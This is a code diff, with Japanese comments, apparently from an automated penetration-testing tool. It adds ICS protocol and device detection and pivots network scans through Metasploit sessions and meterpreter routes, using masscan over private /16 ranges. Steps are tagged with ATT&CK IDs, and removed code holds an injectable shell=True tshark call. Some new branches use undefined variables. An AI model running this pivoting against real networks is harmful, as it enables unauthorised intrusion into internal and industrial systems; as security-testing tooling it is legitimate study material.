+        # 検証内容を CSV 形式にして書き込み
+        self.wcsv.write(["T1046 (detect_ics_protocol) - " + target, self.pre_exe, target, "T1046"])
+        #self.pre_exe = "T1046 (detect_ics_protocol)"
 
-        # pcap file の解析と ICS プロトコルの特定
-        for pcap in self.node[num]["pcap_list"]:
-          print('analyze pcap for detect ics protocol...')
-
-          # ics protocol list と照合
-          with open('./arsenal/ics_protocol_list.txt') as f:
-            for protocol in f:
-              protocol = protocol.replace('\n', '')
-              try: # pcap を tshark にて解析
-                res = subprocess.check_output('tshark -r ' + pcap + ' | grep -i \" ' + protocol + ' \"', shell=True).decode('utf-8')
-                print(res)
-
-                rows = res.splitlines()
-                for row in rows:
-                  c = row.split()
-                  p_list[c[4]] = protocol
-
-              except:
-                print("tshark error!!")
-
-        self.node[num]["ics_protocol"] = copy.deepcopy(p_list)
+        # 現在値を更新
+        goap_node.state["Symbol_GetIcsProtocol"] = True
+        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)
 
         # nodes を json 形式にして書き込み
-        wjson = write_json.WriteJson()
-        wjson.write(self.node_json)
-
-        goap_node.state["Symbol_GetIcsProtocol"] = True
+        self.wjson.write(self.node_json)
 
 
-      # ローカルドライブ上の機密情報の探索
-      elif p == "get_local_secretinfo":
-        pass
 
-
-      # ネットワークドライブ上の機密情報の探索
-      elif p == "get_nw_secretinfo":
-        pass
-
-
-      # 別セグメントのネットワーク探索
-      elif p == "chk_network_segment":
-        pass
+      # ICS デバイスの特定
+      elif p == "detect_ics_device":
+        ics = ics_detect.IcsDetect()
+        ics.detect_device(node_num, self.node)
         
+        # 検証内容を CSV 形式にして書き込み
+        self.wcsv.write(["T1120 (detect_ics_device) - " + target, self.pre_exe, target, "T1120"])
+        #self.pre_exe = "T1120 (detect_ics_device)"
 
-    print("node = {}".format(self.node))
+        # 現在値を更新
+        goap_node.state["Symbol_GetIcsDevice"] = True
+        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)
+
+        # nodes を json 形式にして書き込み
+        self.wjson.write(self.node_json)
+
+
+
+    # target の現在値 (state) を node に格納
+    #self.wjson.write(self.node_json)
+
+    #print("node = {}".format(self.node))
+    return node_id
+
+
+  # すでに発見している IP アドレスか検証
+  def check_ipaddr(self, ipaddr):
+    for num in range(1, len(self.node)): 
+      if ipaddr == self.node[num]["id"]:
+        return -1
+    return 0
+
+
+  # ipconfig_info から IP アドレスを探す処理
+  def getip_from_ipconfig_info(self, num, ipaddr_list):
+    value = iter(self.node[num]["ipconfig_info"])
+
+    for ipaddr, netmask in zip(value, value):
+      if ipaddr != self.node[num]["id"]: # 自分以外のIPアドレスの場合
+        print("ipaddr = {}, netmask = {}".format(ipaddr, netmask))
+        # logging 
+        self.mlogger.writelog("ipaddr = " + ipaddr + ", netmask = " + netmask, "debug")
+        res = self.check_ipaddr(ipaddr) # 重複チェック
+        if res == 0:
+          ipaddr_list[ipaddr] = num
+
+
+  # netstat_info から IP アドレスを探す処理
+  def getip_from_netstat_info(self, num, ipaddr_list):
+    value = iter(self.node[num]["netstat_info"])
+
+    for ipaddr, port in zip(value, value):
+      if ipaddr != self.node[0]["id"]: # mushikago 以外の IP アドレスの場合
+        print("ipaddr = {}, port = {}".format(ipaddr, port))
+        # logging 
+        self.mlogger.writelog("ipaddr = " + ipaddr + ", port = " + port, "debug")
+        res = self.check_ipaddr(ipaddr) # 重複チェック
+        if res == 0:
+          ipaddr_list[ipaddr] = num
+
+
+  # session が確立している端末に対して、network info を GET しているか確認する。
+  # network info で node.json に存在しない端末があった場合、スキャン対象とする
+  def scan_from_network_info(self, ipaddr_list, getnw_list):
+    for num in range(1, len(self.node)): 
+      # session が存在しているものを洗い出し
+      if self.node[num]["session"] != "":
+        print("session is exist = {}".format(self.node[num]["id"]))
+        # logging 
+        self.mlogger.writelog("session is exist = " + self.node[num]["id"], "debug")
+        # network_info から IP アドレスを特定する処理
+        if self.node[num]["goap"]["Symbol_GetNetworkInfo"] == True:
+          if self.node[num]["ipconfig_info"] != "":
+            print("ipconfig_info is exist = {}".format(self.node[num]["ipconfig_info"]))
+            # logging 
+            self.mlogger.writelog("ipconfig_info is exist = " + pprint.pformat(self.node[num]["ipconfig_info"]), "debug")
+            self.getip_from_ipconfig_info(num, ipaddr_list)
+          if self.node[num]["netstat_info"] != "":
+            print("netstat_info is exist = {}".format(self.node[num]["netstat_info"]))
+            # logging 
+            self.mlogger.writelog("netstat_info is exist = " + pprint.pformat(self.node[num]["netstat_info"]), "debug")
+            self.getip_from_netstat_info(num, ipaddr_list)
+        else:
+          # get_networkinfo を実行するリストを作成
+          getnw_list.append(num)
+      else:
+        print("session is nothing = {}".format(self.node[num]["id"]))
+        # logging 
+        self.mlogger.writelog("session is nothing = " + self.node[num]["id"], "debug")
+
+
+  # network_info が 1 つも見つからなかった場合、getnw_list から get_networkinfo を実行する
+  def force_get_networkinfo(self, goap_node, node_id, ipaddr_list, getnw_list):
+    for node_num in getnw_list:
+      # get_networkinfo の実行
+      print("get_networkinfo ipaddr = {}".format(self.node[node_num]["goap"]))
+      goap_node.state = copy.deepcopy(self.node[node_num]["goap"])
+      target = self.node[node_num]["id"]
+      plan = ["get_networkinfo"]
+      node_id = goap_node.plan_execute(goap_node, node_id, plan, target, node_num)
+
+    # 取得した network info をもとに scan を実行
+    self.scan_from_network_info(ipaddr_list, getnw_list)
+
+
+  # segment scan の実行
+  def segment_scan(self, exploit, nwscan, ipaddr, node_num, node_id, pre_node_id, private_ip):
+    nwaddr = IPv4Interface(ipaddr+'/16').network
+    print("scan nwaddr = {}".format(nwaddr))
+    # logging 
+    self.mlogger.writelog("scan nwaddr = " + str(nwaddr), "info")
+    #print("nwaddr_10[0] = {}".format(nwaddr[0]))
+    
+    if private_ip == 10:
+      for scan_nwaddr in self.class_a:
+        exploit.setting_route(scan_nwaddr, "255.255.0.0", self.node[node_num]["session"])
+        node_id = nwscan.execute_masscan(scan_nwaddr+"/16", self.node[node_num]["id"], self.node, self.link, node_id) 
+
+        if node_id > pre_node_id: # スキャンしてデバイスが発見された場合、スキャンを終了
+          try: # スキャンしたネットワークアドレスをリストから削除
+            delete_index = self.class_a.index(str(nwaddr[0]))
+            self.class_a.pop(delete_index)
+          except:
+            pass
+          break
+    elif private_ip == 172:
+      for scan_nwaddr in self.class_b:
+        exploit.setting_route(scan_nwaddr, "255.255.0.0", self.node[node_num]["session"])
+        node_id = nwscan.execute_masscan(scan_nwaddr+"/16", self.node[node_num]["id"], self.node, self.link, node_id) 
+        if node_id > pre_node_id: # スキャンしてデバイスが発見された場合、スキャンを終了
+          try: # スキャンしたネットワークアドレスをリストから削除
+            delete_index = self.class_a.index(str(nwaddr[0]))
+            self.class_a.pop(delete_index)
+          except:
+            pass
+          break
+    elif private_ip == 192:
+      exploit.setting_route(scan_nwaddr, "255.255.0.0", self.node[node_num]["session"])
+      node_id = nwscan.execute_masscan(scan_nwaddr+"/16", self.node[node_num]["id"], self.node, self.link, node_id) 
+
+    return node_id
+
+
+  # ネットワークスキャンする処理
+  def network_scan(self, node_id, goap_node):
+    print("Starting a Network Scan...")
+    # logging 
+    self.mlogger.writelog("Starting a Network Scan...", "info")
+
+    # metasploit にて socks proxy を実行
+    # 初回のみ実行するように修正する
+    exploit = msploit.MetaSploit()
+    exploit.execute_socks()
+
+    ipaddr_list = {} # ipconfig と netstat からスキャン予定の IP アドレスを管理
+    getnw_list = [] # get_networkinfo を実行する IP アドレスを管理
+
+    # network info から target を選定
+    self.scan_from_network_info(ipaddr_list, getnw_list)
+
+    # network_info が 1 つも見つからなかった場合、getnw_list から get_networkinfo を実行する
+    if len(ipaddr_list) == 0 and len(getnw_list) != 0:
+      print("getnw_list = {}".format(getnw_list))
+      # network info を実行
+      self.force_get_networkinfo(goap_node, node_id, ipaddr_list, getnw_list)
+    
+    # scan 対象の IP アドレスが存在する場合、scan を実行
+    if len(ipaddr_list) > 0:
+      print("ipaddr_list = {}".format(ipaddr_list))
+      for scan_ip, node_num in ipaddr_list.items():
+        print("scan_ip = {}, node_num = {}".format(scan_ip, node_num))
+        # meterpreter で add route の設定
+        #exploit = msploit.MetaSploit()
+        exploit.setting_route(scan_ip, "255.255.255.255", self.node[node_num]["session"])
+        # ipaddr_list に対して scan を実行
+        # proxychains 経由で masscan, nmap のスキャンを行う
+        nwscan = masscan.MasScan()
+        node_id = nwscan.execute_masscan(scan_ip, self.node[node_num]["id"], self.node, self.link, node_id) 
+    else:  # network info から scan 対象が取得できない場合
+      session_exist_list = {}
+      #for num in range(1, len(self.node)): 
+      for num in range(len(self.node)-1, -1, -1): # 逆順に取り出し(セグメントの深い方からスキャン対象とするため)
+        # session が存在している IP アドレスとを洗い出し
+        if self.node[num]["session"] != "":
+          session_exist_list[self.node[num]["id"]] = num
+
+      # session の存在するものからセグメントスキャンを行う
+      if (len(session_exist_list) > 0):
+        nwscan = masscan.MasScan()
+        pre_node_id = node_id
+
+        for ipaddr, node_num in session_exist_list.items():
+          print("scan_src_ipaddr= {}".format(ipaddr))
+          s2 = ipaddr.split('.')
+          if (s2[0] == "10"):
+            node_id = self.segment_scan(exploit, nwscan, ipaddr, node_num, node_id, pre_node_id, 10)
+            if node_id > pre_node_id:
+              break
+          elif (s2[0] == "172"):
+            node_id = self.segment_scan(exploit, nwscan, ipaddr, node_num, node_id, pre_node_id, 172)
+            if node_id > pre_node_id:
+              break
+          elif (s2[0] == "192"):
+            node_id = self.segment_scan(exploit, nwscan, ipaddr, node_num, node_id, pre_node_id, 192)
+            if node_id > pre_node_id:
+              break
+      else: # session が存在しない場合、mushikago からスキャンを行う
+        nwscan = masscan.MasScan()
+        pre_node_id = node_id
+
+        s2 = self.mushikago_ipaddr.split('.')
+
+        if (s2[0] == "10"):
+          node_id = self.segment_scan(exploit, nwscan, ipaddr, node_num, node_id, pre_node_id, 10)
+        elif (s2[0] == "172"):
+          node_id = self.segment_scan(exploit, nwscan, ipaddr, node_num, node_id, pre_node_id, 172)
+        elif (s2[0] == "192"):
+          node_id = self.segment_scan(exploit, nwscan, ipaddr, node_num, node_id, pre_node_id, 192)
+
+    # nodes を json 形式にして書き込み
+    self.wjson.write(self.node_json)
+
+    # 検証内容を CSV 形式にして書き込み
+    #self.wcsv.write(["T1046 (network scan) - " + src_ip, self.pre_exe, src_ip, "T1046"])
+    #self.pre_exe = "T1046 (network scan) - " + src_ip
+    self.wcsv.write(["T1046 (network scan)", self.pre_exe, self.mushikago_ipaddr, "T1046"])
+    self.pre_exe = "T1046 (network scan)"
+
+
     return node_id
 
